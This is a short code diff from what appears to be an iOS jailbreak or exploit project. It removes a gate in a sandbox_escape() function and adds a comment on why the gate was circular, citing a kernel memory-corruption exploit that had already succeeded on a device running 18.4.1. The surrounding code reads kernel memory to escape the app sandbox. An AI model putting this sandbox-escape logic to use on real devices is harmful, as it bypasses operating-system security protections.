@@ -280,7 +280,13 @@ int sandbox_escape_read_posix_creds(uint64_t self_proc,
 }
 
 int sandbox_escape(uint64_t self_proc) {
-    if (!exploit_is_done()) { TweakLog("[SBX] Exploit not done, cannot escape sandbox"); return TWEAK_ERR_EXPLOIT_FAILED; }
+    // No exploit_is_done() gate here — it was circular: the flag is only set
+    // AFTER a successful escape (TweakExploit.m exploit_set_done()), so this
+    // returned TWEAK_ERR_EXPLOIT_FAILED on every run ("Exploit not done,
+    // cannot escape sandbox") even though the krw primitive was live — the
+    // corruption had already succeeded (2026-09-01, SE2/18.4.1: "target
+    // corrupted" then immediate retry). The caller (runExploit) only reaches
+    // here when kexploit_opa334() returned 0, i.e. the primitive exists.
     if (!self_proc) { TweakLog("[SBX] self_proc is NULL"); return TWEAK_ERR_INVALID_ARG; }
 
     uint64_t proc_ro_raw = early_kread64(self_proc + OFF_PROC_PROC_RO);
